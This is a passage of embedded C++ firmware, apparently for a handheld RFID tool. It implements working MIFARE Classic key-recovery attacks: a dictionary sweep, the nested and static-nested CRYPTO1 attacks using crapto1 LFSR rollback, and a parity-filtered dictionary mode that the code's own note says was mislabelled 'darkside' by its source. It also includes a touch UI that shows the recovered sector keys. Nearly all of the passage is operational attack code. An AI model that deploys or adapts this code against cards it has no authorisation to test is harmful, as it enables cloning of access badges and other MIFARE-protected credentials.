    int checked = 0;    // candidates walked
    int verified = 0;   // candidates actually taken to the card
    for (struct Crypto1State *rs = revstate; rs->odd != 0 || rs->even != 0; rs++) {
        lfsr_rollback_word(rs, in[0], 0);
        uint64_t candidate = 0;
        crypto1_get_lfsr(rs, &candidate);

        bool soft_match = true;
        for (int i = 1; i < count && soft_match; i++) {
            struct Crypto1State *test = crypto1_create(candidate);
            if (test == nullptr) { soft_match = false; break; }
            const uint32_t testKs = crypto1_word(test, in[i], 0); // FIRST word --
                                                                  // see the DONOR
                                                                  // BUG note above
            crypto1_destroy(test);
            if (ks[i] != testKs) soft_match = false;
        }

        if (soft_match) {
            if (verify_key_on_card(targetCmd, targetBlock, candidate)) {
                *out_key = candidate;
                found = true;
                break;
            }
            if (++verified >= verify_budget) {
                if (!filtered) {
                    char msg[72];
                    std::snprintf(msg, sizeof(msg),
                                  "Gave up after %d of %d candidates (no filter)",
                                  verified, checked + 1);
                    report(msg, 95);
                }
                break;
            }
        }

        if (++checked >= kMaxCandidatesChecked) break;
        if ((checked & 0x3FF) == 0) {
            // Cancellation + a yield point. The candidate walk itself is
            // cheap per iteration but there can be >150k of them.
            if (!report("Verifying candidates...", 90)) break;
            vTaskDelay(1);
        }
    }

    free(revstate); // matches the donor's own free() -- lfsr_recovery32()
                    // returns a plain malloc()ed block ([C1] crapto1.c:130)
    return found;
}

// ── Exploit-sector selection (both nested attacks) ──────────────────────────
// [UG-UI]:812-832 / :976-994: the first sector with ANY known key becomes the
// exploit sector, key A preferred over key B.
bool pick_exploit_sector(uint8_t *out_cmd, uint8_t *out_block, uint64_t *out_key) {
    for (size_t s = 0; s < s_sector_count; s++) {
        if (s_found[s].a.known) {
            *out_cmd = MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_A;
            *out_block = (uint8_t)trailer_block(s);
            *out_key = s_found[s].a.key;
            return true;
        }
        if (s_found[s].b.known) {
            *out_cmd = MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_B;
            *out_block = (uint8_t)trailer_block(s);
            *out_key = s_found[s].b.key;
            return true;
        }
    }
    return false;
}

// ── ATTACK 1: dictionary ────────────────────────────────────────────────────
// Per-sector / per-key-type / per-key loop ported from [UG-UI]:735-796,
// including its card-reset-on-failure behaviour and its "5 consecutive reset
// failures aborts the run" bail-out ([UG-UI]:775-786).
void run_dictionary() {
    uint32_t total_slots = 0;
    for (size_t s = 0; s < s_sector_count; s++) {
        if (!s_found[s].a.known) total_slots++;
        if (!s_found[s].b.known) total_slots++;
    }
    if (total_slots == 0) {
        report("All keys already known", 100);
        return;
    }

    const uint32_t total_tries = total_slots * (uint32_t)s_key_count;
    uint32_t tried = 0;
    report_counts(0, total_tries);

    const uint8_t key_types[2] = {MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_A,
                                  MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_B};

    for (size_t sector = 0; sector < s_sector_count; sector++) {
        for (int kt = 0; kt < 2; kt++) {
            const bool is_key_a = (kt == 0);
            KeySlot &slot = is_key_a ? s_found[sector].a : s_found[sector].b;
            if (slot.known) continue;

            const int block = trailer_block(sector);
            char msg[72];
            std::snprintf(msg, sizeof(msg), "Dict S%u key %c (%u keys)",
                          (unsigned)sector, is_key_a ? 'A' : 'B',
                          (unsigned)s_key_count);
            if (!report(msg, (int)(tried * 100 / (total_tries ? total_tries : 1)))) return;

            for (size_t k = 0; k < s_key_count; k++) {
                if (s_stop_requested) return;

                MFRC522_I2C::MIFARE_Key mfKey;
                key_to_bytes(s_keys[k], mfKey.keyByte);

                const uint8_t response = s_mfrc.PCD_Authenticate(
                    key_types[kt], (uint8_t)block, &mfKey, &s_mfrc.uid);

                tried++;
                report_counts(tried, total_tries);

                if (response == MFRC522_I2C::STATUS_OK) {
                    record_key(sector, is_key_a, s_keys[k]);
                    s_mfrc.PCD_StopCrypto1();
                    break;
                }

                // Failed auth leaves the card unusable until it is halted,
                // woken and re-selected. [UG-UI]:775-786.
                int counter = 0;
                while (!reset_card_state()) {
                    if (++counter > 5) {
                        fail("Card stopped responding (reset failed)");
                        return;
                    }
                    delay(100);
                }
                vTaskDelay(1); // explicit yield: the delays inside
                               // reset_card_state() already yield, this
                               // covers the success path too
            }
        }
    }
    report("Dictionary sweep complete", 100);
}

// ── ATTACK 2: nested (non-static nonce) ─────────────────────────────────────
// Ported from [UG-N]. One collected sample = one (nt1, encNt2, parity) triple.

struct NestedSample {
    uint32_t nt1;    // plaintext nonce from the exploit-sector auth
    uint32_t encNt2; // encrypted nonce from the target sector
    uint8_t  par[3]; // parity bits of encNt2
};

// [UG-N]:140-226. The raw nested-authentication exchange, unchanged in
// sequence: plain auth on the exploit block -> initialise CRYPTO1 with the
// known key -> send encrypted {nR, aR} -> validate aT -> send an ENCRYPTED
// auth for the target block -> read back the encrypted nested nonce.
bool collect_nested_sample(uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
                           uint8_t targetCmd, uint8_t targetBlock,
                           NestedSample *out) {
    uint8_t pkt[9], par[8], data[8];

    parity_off();

    // Step 1: auth command for the exploit block -> plaintext Nt1.
    uint8_t cmd[4];
    cmd[0] = authCmd;
    cmd[1] = exploitBlock;
    calc_crc(cmd, 2, &cmd[2]);
    for (int i = 0; i < 4; i++) par[i] = oddparity(cmd[i]);
    uint8_t vb = make_raw_frame(cmd, 4, par, pkt);
    if (!picc_io(MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
        parity_on();
        return false;
    }
    extract_data(pkt, 5, par, data);
    const uint32_t nt1 = (uint32_t)bytes_to_int(data, 4);
    out->nt1 = nt1;

    // Step 2: initialise the keystream with the known key and Nt1.
    struct Crypto1State *ks = crypto1_create(knownKey);
    if (ks == nullptr) { parity_on(); return false; }
    crypto1_word(ks, nt1 ^ s_uid32, 0);

    // Step 3: encrypted reader nonce (zeros) + reader answer.
    uint8_t n_R[4] = {0};
    for (int i = 0; i < 4; i++) {
        data[i] = crypto1_byte(ks, n_R[i], 0) ^ n_R[i];
        par[i]  = filter(ks->odd) ^ oddparity(n_R[i]);
    }
    uint32_t n_T = prng_successor(nt1, 32);
    for (int i = 4; i < 8; i++) {
        n_T = prng_successor(n_T, 8);
        const uint8_t ar_byte = (uint8_t)(n_T & 0xFF);
        data[i] = crypto1_byte(ks, ar_byte, 0) ^ ar_byte;
        par[i]  = filter(ks->odd) ^ oddparity((uint8_t)n_T);
    }

    vb = make_raw_frame(data, 8, par, pkt);
    if (!picc_io(MFRC522_I2C::PCD_Transceive, 9, pkt, 9, vb)) {
        parity_on();
        crypto1_destroy(ks);
        return false;
    }

    // Step 4: validate the tag's answer.
    extract_data(pkt, 5, par, data);
    const uint32_t a_T_raw = (uint32_t)bytes_to_int(data, 4);
    const uint32_t expected_n_T = prng_successor(n_T, 32);
    const uint32_t a_T = crypto1_word(ks, 0x00, 0) ^ a_T_raw;
    if (a_T != expected_n_T) {
        parity_on();
        crypto1_destroy(ks);
        return false;
    }

    // Step 5: encrypted auth for the TARGET block.
    uint8_t unenc[4];
    unenc[0] = targetCmd;
    unenc[1] = targetBlock;
    calc_crc(unenc, 2, &unenc[2]);
    for (int i = 0; i < 4; i++) {
        data[i] = crypto1_byte(ks, 0x00, 0) ^ unenc[i];
        par[i]  = filter(ks->odd) ^ oddparity(unenc[i]);
    }
    vb = make_raw_frame(data, 4, par, pkt);
    if (!picc_io(MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
        crypto1_destroy(ks);
        parity_on();
        return false;
    }
    crypto1_destroy(ks);

    // Step 6: the encrypted nested nonce plus its parity bits.
    extract_data(pkt, 5, par, data);
    out->encNt2 = (uint32_t)bytes_to_int(data, 4);
    for (int i = 0; i < 3; i++) out->par[i] = (oddparity(data[i]) != par[i]);

    parity_on();
    return true;
}

// [UG-N]:230-342, per target sector/key-type.
bool crack_nested_target(uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
                         uint8_t targetCmd, uint8_t targetBlock, uint64_t *out_key) {
    NestedSample samples[kCollectNonces];
    int collected = 0;

    // [UG-N]:241-255: MAX_ATTEMPTS = COLLECT_NR * 4.
    for (int attempt = 0; attempt < kCollectNonces * 4 && collected < kCollectNonces;
         attempt++) {
        if (s_stop_requested) return false;
        reset_picc();
        if (!init_com()) continue;
        if (collect_nested_sample(authCmd, exploitBlock, knownKey,
                                  targetCmd, targetBlock, &samples[collected])) {
            collected++;
        }
    }

    // Two samples minimum: with only one there is nothing for
    // recover_from_ks()'s software cross-check to compare against, and the
    // candidate walk degenerates into the unfiltered case documented there
    // (~75,000 on-card authentications). The donor proceeds on one anyway
    // ([UG-N]:257-260 only bails at zero).
    if (collected < 2) return false;

    // Enumerate all 65535 PRNG distances between the exploit nonce and the
    // target nonce. [UG-N]:268-298.
    for (uint32_t d = 0; d < 65535; d++) {
        if ((d & 0x1FFF) == 0) {
            char msg[72];
            std::snprintf(msg, sizeof(msg), "Sweeping PRNG distance %lu/65535",
                          (unsigned long)d);
            if (!report(msg, 40 + (int)((d * 50UL) / 65535UL))) return false;
            report_counts(d, 65535);
            vTaskDelay(1);
        }

        const uint32_t nt2_0 = prng_successor(samples[0].nt1, d);
        const uint32_t ks1_0 = samples[0].encNt2 ^ nt2_0;
        if (!is_nonce(nt2_0, samples[0].encNt2, ks1_0, samples[0].par)) continue;

        uint32_t ks[kCollectNonces];
        uint32_t in[kCollectNonces];
        bool all_match = true;
        for (int i = 0; i < collected && all_match; i++) {
            const uint32_t nt2_i = prng_successor(samples[i].nt1, d);
            ks[i] = samples[i].encNt2 ^ nt2_i;
            in[i] = nt2_i ^ s_uid32;
            if (!is_nonce(nt2_i, samples[i].encNt2, ks[i], samples[i].par)) {
                all_match = false;
            }
        }
        if (!all_match) continue;

        if (recover_from_ks(ks, in, collected, targetCmd, targetBlock, out_key)) {
            return true;
        }
        if (s_run_failed) return false;
    }
    return false;
}

// ── ATTACK 3: static nested ─────────────────────────────────────────────────
// Ported from [UG-S].

// [UG-S]:139-163.
bool get_tag_nonce(uint8_t authCmd, uint8_t blockAddr, uint32_t *out_nt) {
    uint8_t cmd[4], par[4], pkt[9];
    cmd[0] = authCmd;
    cmd[1] = blockAddr;
    calc_crc(cmd, 2, &cmd[2]);
    for (int i = 0; i < 4; i++) par[i] = oddparity(cmd[i]);
    const uint8_t vb = make_raw_frame(cmd, 4, par, pkt);

    parity_off();
    if (!picc_io(MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
        parity_on();
        return false;
    }
    uint8_t data[4], rpar[4];
    extract_data(pkt, 5, rpar, data);
    *out_nt = (uint32_t)bytes_to_int(data, 4);
    parity_on();
    return true;
}

// [UG-S]:287-304.
bool is_static_nonce(uint8_t authCmd, uint8_t block) {
    uint32_t nt1 = 0, nt2 = 0;
    parity_on();
    reset_picc();
    if (!init_com()) return false;
    if (!get_tag_nonce(authCmd, block, &nt1)) return false;
    reset_picc();
    if (!init_com()) return false;
    if (!get_tag_nonce(authCmd, block, &nt2)) return false;
    return (nt1 == nt2 && nt1 != 0);
}

// [UG-S]:306-420, per target sector/key-type. The static-nonce case skips the
// PRNG-distance sweep entirely: the tag nonce never changes, so the keystream
// is directly encNt ^ staticNt ([UG-S]:369-376).
bool crack_static_nested_target(uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
                                uint8_t targetCmd, uint8_t targetBlock,
                                uint32_t staticNt, uint64_t *out_key) {
    uint32_t ks[kCollectNonces];
    uint32_t in[kCollectNonces];
    int collected = 0;

    // [UG-S]:347-365 (COLLECT_NR * 3 attempts). collect_nested_sample() is the
    // same exchange [UG-S]:167-263 performs; the donor duplicates it in both
    // files with only cosmetic differences, so the one copy is reused.
    for (int attempt = 0; attempt < kCollectNonces * 3 && collected < kCollectNonces;
         attempt++) {
        if (s_stop_requested) return false;
        reset_picc();
        if (!init_com()) continue;
        NestedSample sample{};
        if (collect_nested_sample(authCmd, exploitBlock, knownKey,
                                  targetCmd, targetBlock, &sample)) {
            ks[collected] = sample.encNt2 ^ staticNt;
            in[collected] = staticNt ^ s_uid32;
            collected++;
            char msg[72];
            std::snprintf(msg, sizeof(msg), "Collected %d/%d nonces",
                          collected, kCollectNonces);
            if (!report(msg, 15 + collected * 20)) return false;
        }
    }

    if (collected < 1) return false;
    // No "two nonces minimum" here, unlike the non-static path: on a static-
    // nonce card the extra samples are byte-identical to the first by
    // definition, so they add no discrimination at all. They are still worth
    // collecting -- if they were NOT identical, the card's nonce is not
    // actually static and the run is being done in the wrong mode.
    for (int i = 1; i < collected; i++) {
        if (ks[i] != ks[0]) {
            fail("Nonce changed mid-run -- not a static-nonce card");
            return false;
        }
    }
    if (!report("Recovering key (unfiltered -- long shot)...", 70)) return false;
    return recover_from_ks(ks, in, collected, targetCmd, targetBlock, out_key);
}

// Shared driver for both nested variants: pick an exploit sector, then walk
// every still-unknown sector/key-type. [UG-UI]:834-940 (static) and
// :996-1078 (nested) -- structurally the same loop in both.
void run_nested(bool is_static) {
    uint8_t exploit_cmd = 0, exploit_block = 0;
    uint64_t exploit_key = 0;
    if (!pick_exploit_sector(&exploit_cmd, &exploit_block, &exploit_key)) {
        fail("Need one known key first -- run Dictionary");
        return;
    }

    uint32_t static_nt = 0;
    if (is_static) {
        if (!report("Detecting static nonce...", 5)) return;
        if (!is_static_nonce(exploit_cmd, exploit_block)) {
            fail("Card nonce is not static -- use Nested");
            return;
        }
        parity_on();
        reset_picc();
        if (!init_com() || !get_tag_nonce(exploit_cmd, exploit_block, &static_nt)) {
            fail("Could not read the static nonce");
            return;
        }
    }

    uint32_t slots_done = 0, slots_total = 0;
    for (size_t s = 0; s < s_sector_count; s++) {
        if (!s_found[s].a.known) slots_total++;
        if (!s_found[s].b.known) slots_total++;
    }
    report_counts(0, slots_total);

    for (size_t sector = 0; sector < s_sector_count; sector++) {
        for (int kt = 0; kt < 2; kt++) {
            if (s_stop_requested || s_run_failed) return;
            const bool is_key_a = (kt == 0);
            if ((is_key_a ? s_found[sector].a.known : s_found[sector].b.known)) continue;

            const uint8_t target_cmd = is_key_a ? MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_A
                                                : MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_B;
            const uint8_t target_block = (uint8_t)trailer_block(sector);

            char msg[72];
            std::snprintf(msg, sizeof(msg), "%s target S%u key %c",
                          is_static ? "Static-nested" : "Nested",
                          (unsigned)sector, is_key_a ? 'A' : 'B');
            if (!report(msg, (int)(slots_done * 100 / (slots_total ? slots_total : 1)))) {
                return;
            }

            uint64_t key = 0;
            const bool ok = is_static
                ? crack_static_nested_target(exploit_cmd, exploit_block, exploit_key,
                                             target_cmd, target_block, static_nt, &key)
                : crack_nested_target(exploit_cmd, exploit_block, exploit_key,
                                      target_cmd, target_block, &key);
            if (ok) record_key(sector, is_key_a, key);

            slots_done++;
            report_counts(slots_done, slots_total);
            vTaskDelay(1);
        }
    }
    report(is_static ? "Static-nested sweep complete" : "Nested sweep complete", 100);
}

// ── ATTACK 4: "darkside" ────────────────────────────────────────────────────
//
// HONESTY NOTE -- READ BEFORE BELIEVING THE NAME. [UG-D] is called
// DarksideAttack and its header claims it "recovers a key when NO key is
// known", but reading what it actually does (:297-380): it collects a handful
// of (nt, parity-guess) pairs from authentications the tag answered, then
// tests CANDIDATE KEYS FROM A LIST against those pairs in software
// (verifyKeyAgainstOracle, :205-225) before confirming the survivor on the
// card. Every key it can possibly return comes from COMMON_KEYS[] or a
// dictionary file (:321-374). It is a dictionary attack with a fast software
// pre-filter -- NOT the Courtois darkside attack, which recovers key bits
// from 4-bit NACK/parity leakage via lfsr_common_prefix() and needs no
// candidate list at all. Nothing here calls lfsr_common_prefix (the vendored
// crapto1 does not even provide it).
//
// The port is faithful to what the donor does; the NAME is where the port
// diverges, deliberately: the UI calls this "Parity-oracle dictionary" so
// nobody runs it expecting to crack an unknown key. See this task's report.

struct DarksideOracle {
    uint32_t nt;
    uint8_t  par[4]; // the parity bits we sent for the four nR bytes
};
constexpr int kMaxOracles = 4; // [UG-D]:129

// [UG-D]:135-197.
int collect_oracles(uint8_t authCmd, uint8_t blockAddr, DarksideOracle *oracles) {
    int collected = 0;
    const int max_attempts = kMaxOracles * 256;

    for (int attempt = 0; attempt < max_attempts && collected < kMaxOracles; attempt++) {
        if (s_stop_requested) return collected;
        if ((attempt % 32) == 0) {
            char msg[72];
            std::snprintf(msg, sizeof(msg), "Collecting oracle %d/%d...",
                          collected + 1, kMaxOracles);
            if (!report(msg, 5 + collected * 15)) return collected;
            report_counts((uint32_t)attempt, (uint32_t)max_attempts);
            vTaskDelay(1);
        }

        parity_on();
        reset_picc();
        if (!init_com()) continue;
        parity_off();

        uint8_t cmd[4];
        cmd[0] = authCmd;
        cmd[1] = blockAddr;
        calc_crc(cmd, 2, &cmd[2]);

        uint8_t cmdPar[4], pkt[9];
        for (int i = 0; i < 4; i++) cmdPar[i] = oddparity(cmd[i]);
        uint8_t vb = make_raw_frame(cmd, 4, cmdPar, pkt);
        if (!picc_io(MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) continue;

        uint8_t rData[4], rPar[4];
        extract_data(pkt, 5, rPar, rData);
        const uint32_t nt = ((uint32_t)rData[0] << 24) | ((uint32_t)rData[1] << 16) |
                            ((uint32_t)rData[2] << 8) | rData[3];

        // {nr = 0, ar = 0} with the attempt counter used as the parity guess
        // for the four nR bytes. [UG-D]:172-185.
        uint8_t data[8] = {0};
        uint8_t par[8];
        const uint8_t parGuess = (uint8_t)(attempt & 0xFF);
        for (int i = 0; i < 4; i++) par[i] = (parGuess >> i) & 1;
        for (int i = 4; i < 8; i++) par[i] = 0;

        vb = make_raw_frame(data, 8, par, pkt);
        if (picc_io(MFRC522_I2C::PCD_Transceive, 9, pkt, 9, vb)) {
            oracles[collected].nt = nt;
            std::memcpy(oracles[collected].par, par, 4);
            collected++;
        }
    }
    parity_on();
    return collected;
}

// [UG-D]:205-225. Software CRYPTO1 simulation of the parity the tag would
// have checked. NOTE this one deliberately uses the keystream AFTER the
// (uid ^ nt) feed -- unlike the nested cross-check fixed above -- and that is
// correct here: the nR bytes really are encrypted with the keystream that
// follows the nonce feed, not with the nonce feed's own output.
bool verify_key_against_oracle(uint64_t key, const DarksideOracle *oracles, int count) {
    for (int o = 0; o < count; o++) {
        struct Crypto1State *state = crypto1_create(key);
        if (state == nullptr) return false;
        crypto1_word(state, s_uid32 ^ oracles[o].nt, 0);

        bool match = true;
        for (int i = 0; i < 4 && match; i++) {
            const uint8_t ks_byte = crypto1_byte(state, 0, 0);
            const uint8_t ks_par = filter(state->odd);
            if ((oracles[o].par[i] ^ ks_par) != oddparity(ks_byte)) match = false;
        }
        crypto1_destroy(state);
        if (!match) return false;
    }
    return true;
}

// [UG-D]:297-380, attacking sector 0 key A (trailer block 3), which is the
// only target [UG-UI]:1126-1136 ever passes it.
void run_darkside() {
    DarksideOracle oracles[kMaxOracles];
    const int oracle_count = collect_oracles(MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_A, 3,
                                             oracles);
    if (oracle_count == 0) {
        fail("No oracle data collected");
        return;
    }

    char msg[72];
    std::snprintf(msg, sizeof(msg), "Testing %u keys against %d oracles...",
                  (unsigned)s_key_count, oracle_count);
    if (!report(msg, 65)) return;
    report_counts(0, (uint32_t)s_key_count);

    for (size_t i = 0; i < s_key_count; i++) {
        if (s_stop_requested) return;
        report_counts((uint32_t)i, (uint32_t)s_key_count);
        if ((i & 0x0F) == 0) vTaskDelay(1);

        if (!verify_key_against_oracle(s_keys[i], oracles, oracle_count)) continue;
        if (verify_key_on_card(MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_A, 3, s_keys[i])) {
            record_key(0, true, s_keys[i]);
            report("Key A of sector 0 recovered", 100);
            return;
        }
    }
    report("No key found", 100);
}

// ── Worker ──────────────────────────────────────────────────────────────────

void worker_task(void *) {
    switch (s_mode) {
        case Mode::kDictionary:   run_dictionary();   break;
        case Mode::kNested:       run_nested(false);  break;
        case Mode::kStaticNested: run_nested(true);   break;
        case Mode::kDarkside:     run_darkside();     break;
    }

    // Leave hardware parity re-enabled whatever happened; poll() re-runs
    // Ws1850sDriver::init() on the main task for the rest.
    parity_on();
    s_mfrc.PCD_StopCrypto1();

    Serial.printf("quarky-tab5: [mifare-crack] worker exiting -- stack high-water "
                  "mark %u bytes free of %u\n",
                  (unsigned)(uxTaskGetStackHighWaterMark(nullptr) * sizeof(StackType_t)),
                  (unsigned)kWorkerStackBytes);

    s_worker_done = true; // publish last; poll() reads this on the main task
    vTaskDelete(nullptr);
}

// ── UI ──────────────────────────────────────────────────────────────────────

lv_obj_t *s_mode_dropdown = nullptr;
lv_obj_t *s_status_label  = nullptr;
lv_obj_t *s_progress_bar  = nullptr;
lv_obj_t *s_counts_label  = nullptr;
lv_obj_t *s_keys_label    = nullptr;
lv_obj_t *s_toggle_btn    = nullptr;
lv_obj_t *s_toggle_label  = nullptr;

const char *mode_name(Mode m) {
    switch (m) {
        case Mode::kDictionary:   return "Dictionary";
        case Mode::kNested:       return "Nested";
        case Mode::kStaticNested: return "Static nested";
        case Mode::kDarkside:     return "Parity-oracle dictionary";
    }
    return "?";
}

void refresh_keys_label() {
    if (s_keys_label == nullptr) return;
    char buf[512];
    int n = std::snprintf(buf, sizeof(buf), "Recovered keys:");
    int shown = 0;
    lock();
    for (size_t s = 0; s < s_sector_count && n < (int)sizeof(buf) - 40; s++) {
        for (int kt = 0; kt < 2; kt++) {
            const KeySlot &slot = (kt == 0) ? s_found[s].a : s_found[s].b;
            if (!slot.known) continue;
            uint8_t kb[6];
            key_to_bytes(slot.key, kb);
            n += std::snprintf(buf + n, sizeof(buf) - (size_t)n,
                               "\nS%u %c %02X%02X%02X%02X%02X%02X",
                               (unsigned)s, (kt == 0) ? 'A' : 'B',
                               kb[0], kb[1], kb[2], kb[3], kb[4], kb[5]);
            shown++;
        }
    }
    unlock();
    if (shown == 0) std::snprintf(buf, sizeof(buf), "Recovered keys: none yet");
    lv_label_set_text(s_keys_label, buf);
}

void update_ui() {
    if (s_mode_dropdown != nullptr) {
        if (s_worker_running) lv_obj_add_state(s_mode_dropdown, LV_STATE_DISABLED);
        else                  lv_obj_remove_state(s_mode_dropdown, LV_STATE_DISABLED);
    }
    if (s_toggle_label != nullptr) {
        lv_label_set_text(s_toggle_label, s_worker_running ? "Stop" : "Start");
    }

    Progress snap;
    lock();
    snap = s_progress;
    unlock();

    if (s_status_label != nullptr) {
        lv_label_set_text(s_status_label, snap.msg[0] != '\0' ? snap.msg : "Idle");
    }
    if (s_progress_bar != nullptr) {
        lv_bar_set_value(s_progress_bar, snap.pct, LV_ANIM_OFF);
    }
    if (s_counts_label != nullptr) {
        const uint32_t elapsed_s = (s_started_ms == 0)
                                       ? 0u : (millis() - s_started_ms) / 1000u;
        char buf[128];
        if (snap.total > 0) {
            std::snprintf(buf, sizeof(buf),
                          "%lu / %lu tried   %d keys found   %lum %02lus elapsed",
                          (unsigned long)snap.tried, (unsigned long)snap.total,
                          snap.recovered,
                          (unsigned long)(elapsed_s / 60), (unsigned long)(elapsed_s % 60));
        } else {
            std::snprintf(buf, sizeof(buf), "%d keys found   %lum %02lus elapsed",
                          snap.recovered,
                          (unsigned long)(elapsed_s / 60), (unsigned long)(elapsed_s % 60));
        }
        lv_label_set_text(s_counts_label, buf);
    }
}

void set_status(const char *text) {
    lock();
    std::snprintf(s_progress.msg, sizeof(s_progress.msg), "%s", text);
    unlock();
    if (s_status_label != nullptr) lv_label_set_text(s_status_label, text);
}

// Main-task bring-up: power/claim the bus, apply Task 3's register programme,
// select a card and learn its type. Everything here is main-task-only by
// construction (see the COMPOSITION note).
bool prepare_card() {
    if (!Ws1850sDriver::init() || !Ws1850sDriver::field_on()) {
        set_status("RFID2 unit not responding -- check PORT.A");
        return false;
    }

    // Same PICC contract nfc_read.cpp documents: IsNewCardPresent() (REQA +
    // ATQA) must precede ReadCardSerial() (the anticollision cascade).
    if (!s_mfrc.PICC_IsNewCardPresent() || !s_mfrc.PICC_ReadCardSerial()) {
        set_status("No card on the reader");
        return false;
    }

    const uint8_t picc_type = s_mfrc.PICC_GetType(s_mfrc.uid.sak);
    switch (picc_type) {
        case MFRC522_I2C::PICC_TYPE_MIFARE_MINI: s_sector_count = kSectorsMini; break;
        case MFRC522_I2C::PICC_TYPE_MIFARE_1K:   s_sector_count = kSectors1K;   break;
        case MFRC522_I2C::PICC_TYPE_MIFARE_4K:   s_sector_count = kSectors4K;   break;
        default:
            set_status("Not a MIFARE Classic card");
            return false;
    }

    // The attacks take a 32-bit UID ([UG-UI]:834-836 builds it from the first
    // four UID bytes regardless of the real UID length -- CRYPTO1 only ever
    // mixes in four bytes).
    s_uid32 = 0;
    for (int i = 0; i < 4; i++) s_uid32 = (s_uid32 << 8) | s_mfrc.uid.uidByte[i];

    // Discard s_found if it holds keys recovered from a DIFFERENT card than
    // the one just selected (see s_found_uid32's own comment). A same-card
    // re-scan (the common Dictionary-then-Nested workflow) has s_uid32 ==
    // s_found_uid32 and is a no-op here.
    bool any_known = false;
    for (size_t i = 0; i < kMaxSectors && !any_known; i++) {
        if (s_found[i].a.known || s_found[i].b.known) any_known = true;
    }
    if (any_known && s_uid32 != s_found_uid32) {
        Serial.println("quarky-tab5: [mifare-crack] Different card since last known-key "
                        "run -- discarding stale keys (run Dictionary on this card first)");
        lock();
        for (size_t i = 0; i < kMaxSectors; i++) s_found[i] = SectorKeys{};
        unlock();
    }
    s_found_uid32 = s_uid32;

    NfcCommon::TagInfo info{};
    info.uid_len = s_mfrc.uid.size;
    for (uint8_t i = 0; i < info.uid_len && i < sizeof(info.uid); i++) {
        info.uid[i] = s_mfrc.uid.uidByte[i];
    }
    char uid_str[64];
    NfcCommon::format_uid(info.uid, info.uid_len, uid_str, sizeof(uid_str));
    Serial.printf("quarky-tab5: [mifare-crack] target UID %s, %u sectors\n",
                  uid_str, (unsigned)s_sector_count);
    return true;
}

void start_run() {
    s_stop_requested = false;
    s_run_failed = false;
    s_fail_reason[0] = '\0';
    s_worker_done = false;

    lock();
    std::memset(&s_progress, 0, sizeof(s_progress));
    unlock();

    if (!prepare_card()) {
        update_ui();
        return;
    }

    // Reload the key list every run so a dictionary dropped on the SD card
    // between runs is picked up without a reboot.
    load_keys(storage);
    if (s_key_count == 0) {
        set_status("No keys available");
        update_ui();
        return;
    }

    s_started_ms = millis();
    s_worker_running = true;
    set_status("Starting...");

    const BaseType_t created = xTaskCreatePinnedToCore(
        worker_task, "mifare_crack", kWorkerStackBytes, nullptr,
        kWorkerPriority, nullptr, kWorkerCore);
    if (created != pdPASS) {
        s_worker_running = false;
        set_status("Could not start worker task (out of memory)");
        Serial.println("quarky-tab5: [mifare-crack] xTaskCreatePinnedToCore() failed");
    }
    update_ui();
}

void toggle_click_cb(lv_event_t *) {
    if (s_worker_running) {
        s_stop_requested = true;
        set_status("Stopping...");
        Serial.println("quarky-tab5: [mifare-crack] Stop tapped by user");
        return;
    }
    if (s_mode_dropdown != nullptr) {
        s_mode = (Mode)lv_dropdown_get_selected(s_mode_dropdown);
    }
    // A fresh run starts from no known keys EXCEPT when the mode needs one
    // (both nested variants read s_found to pick their exploit sector, so a
    // previous Dictionary run's results must survive).
    if (s_mode == Mode::kDictionary || s_mode == Mode::kDarkside) {
        lock();
        for (size_t i = 0; i < kMaxSectors; i++) s_found[i] = SectorKeys{};
        unlock();
    }
    Serial.printf("quarky-tab5: [mifare-crack] Start tapped -- mode=%s\n",
                  mode_name(s_mode));
    start_run();
}

lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("MIFARE Classic Keys", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *warn = lv_label_create(content);
    lv_label_set_text(warn,
        "RFID2 unit only. Hold one MIFARE Classic card on the reader for the "
        "whole run. Nested modes need a key from a Dictionary run first.");
    lv_label_set_long_mode(warn, LV_LABEL_LONG_WRAP);

    s_mode_dropdown = lv_dropdown_create(content);
    // Two of these labels deliberately do not match the donor's own names --
    // see the DARKSIDE honesty note, and recover_from_ks()'s UNFILTERED
    // CANDIDATE WALK note, for why each is qualified rather than sold as
    // more than it is.
    lv_dropdown_set_options(s_mode_dropdown,
                            "Dictionary\nNested\nStatic nested (long shot)\n"
                            "Parity-oracle dictionary");
    lv_dropdown_set_selected(s_mode_dropdown, (uint32_t)s_mode);

    s_status_label = lv_label_create(content);
    lv_label_set_long_mode(s_status_label, LV_LABEL_LONG_WRAP);

    s_progress_bar = lv_bar_create(content);
    lv_obj_set_size(s_progress_bar, LV_PCT(100), 16);
    lv_bar_set_range(s_progress_bar, 0, 100);
    lv_bar_set_value(s_progress_bar, 0, LV_ANIM_OFF);

    s_counts_label = lv_label_create(content);
    s_keys_label = lv_label_create(content);
    lv_label_set_long_mode(s_keys_label, LV_LABEL_LONG_WRAP);

    s_toggle_btn = lv_button_create(content);
    s_toggle_label = lv_label_create(s_toggle_btn);
    lv_obj_add_event_cb(s_toggle_btn, toggle_click_cb, LV_EVENT_CLICKED, nullptr);

    update_ui();
    refresh_keys_label();

    // Teardown. Null every widget pointer FIRST (update_ui()/set_status()
    // already no-op on null), then ask any in-flight run to stop -- the same
    // shape rf433_bruteforce.cpp's DELETE handler uses, and for the same
    // reason: a multi-minute attack must not keep energising the field and
    // holding the GPIO53 arbiter after the user has backed out with nothing
    // on screen to report it. The worker is NOT killed here: poll() reaps it
    // on the main task (see poll()), because the arbiter release and the
    // Ws1850sDriver::init() restore are both main-task-only.
    lv_obj_add_event_cb(content, [](lv_event_t *) {
        s_mode_dropdown = nullptr;
        s_status_label = nullptr;
